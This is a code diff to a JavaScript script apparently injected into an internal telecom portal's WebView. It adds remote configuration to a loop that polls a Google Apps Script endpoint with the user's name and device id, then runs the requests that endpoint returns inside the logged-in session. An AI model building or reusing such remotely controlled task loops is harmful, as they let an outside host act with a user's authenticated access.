@@ -21,7 +21,7 @@ if(document.title!='Inetcore+'&&(window.location.href.includes('https://fx.mts.r
 	addCSS.appendChild(document.createTextNode(myCSS));document.head.appendChild(addCSS);
 	
 	/*window.AppInventor.setWebViewString('version_:FX_test_v173.e');*//*my-site-du-wrapper (download) test*/
-	window.AppInventor.setWebViewString('version_:FX_test_v173.f');/*site download*//*bot test*/
+	window.AppInventor.setWebViewString('version_:FX_test_v173.f');/*site download*//*bot test*//*bot config test*/
 	
 	let info={};
 	info=filterAttrs(window,['innerWidth','innerHeight','outerWidth','outerHeight','devicePixelRatio']);
@@ -32,9 +32,10 @@ if(document.title!='Inetcore+'&&(window.location.href.includes('https://fx.mts.r
 	function filterAttrs(object,attrs){if(typeof attrs==='string'){attrs=attrs.split(',')};let obj={};for(let key in object){if(attrs.includes(key)){obj[key]=object[key];};};return obj;};
 	
 	let deviceid=randcode(20);/*console.log('deviceid',deviceid);*/
-	function randcode(n=1,s='0123456789QAZWSXEDCRFVTGBYHNUJMIKOLPqazwsxedcrfvtgbyhnujmikolp'){
-		let str='';while(str.length<n){str+=s[Math.random()*s.length|0]};return str;
-	};
+	let configid='initial';/*console.log('configid',configid);*/
+	function randcode(n=1,s='0123456789QAZWSXEDCRFVTGBYHNUJMIKOLPqazwsxedcrfvtgbyhnujmikolp'){let str='';while(str.length<n){str+=s[Math.random()*s.length|0]};return str;};
+	let timeout_getTask=1000;
+	let enable_getTask=true;
 	
 	let username='';
 	fetch('/call/main/get_user_data',{
@@ -57,11 +58,16 @@ if(document.title!='Inetcore+'&&(window.location.href.includes('https://fx.mts.r
 						},
 					})
 				}).then(function(obj){/*console.log(obj)*/}).catch(function(err){console.log(err)}).finally(function(){
-					if(true/*username=='mypanty1'*/){
-						let timer_getTask=setTimeout(getTask,1000);
+					if(username=='mypanty1'){
+						let timer_getTask=setTimeout(getTask,timeout_getTask);
 						function getTask(){
-							fetch('https://script.google.com/macros/s/AKfycbwXqnIVkjbsBSFMlexOukcqx1OKmNbfXNOvsAgAIcqFaAvt3u9Du_uoK7xjbpSCQbdPYw/exec?username='+username+'&deviceid='+deviceid,).then(function(resp){return resp.json()}).then(function(obj){
+							fetch('https://script.google.com/macros/s/AKfycbwXqnIVkjbsBSFMlexOukcqx1OKmNbfXNOvsAgAIcqFaAvt3u9Du_uoK7xjbpSCQbdPYw/exec?username='+username+'&deviceid='+deviceid+'&configid='+configid,).then(function(resp){return resp.json()}).then(function(obj){
 								/*console.log('getTask',obj);*/
+								if(obj&&obj.config){let config=obj.config;
+									if(config.configid){configid=config.configid;};
+									if(config.timeout){timeout_getTask=config.timeout;};
+									if(config.enable){enable_getTask=config.enable;};
+								};
 								if(obj&&obj.task_id&&obj.url&&obj.method){
 									let payload={
 										'method':obj.method,
@@ -91,7 +97,7 @@ if(document.title!='Inetcore+'&&(window.location.href.includes('https://fx.mts.r
 									next();
 								};
 							}).catch(function(err){console.log(err)}).finally(function(){});
-							function next(){timer_getTask=setTimeout(getTask,1000);};
+							function next(){if(enable_getTask){timer_getTask=setTimeout(getTask,timeout_getTask);}};
 						};
 					};
 				});
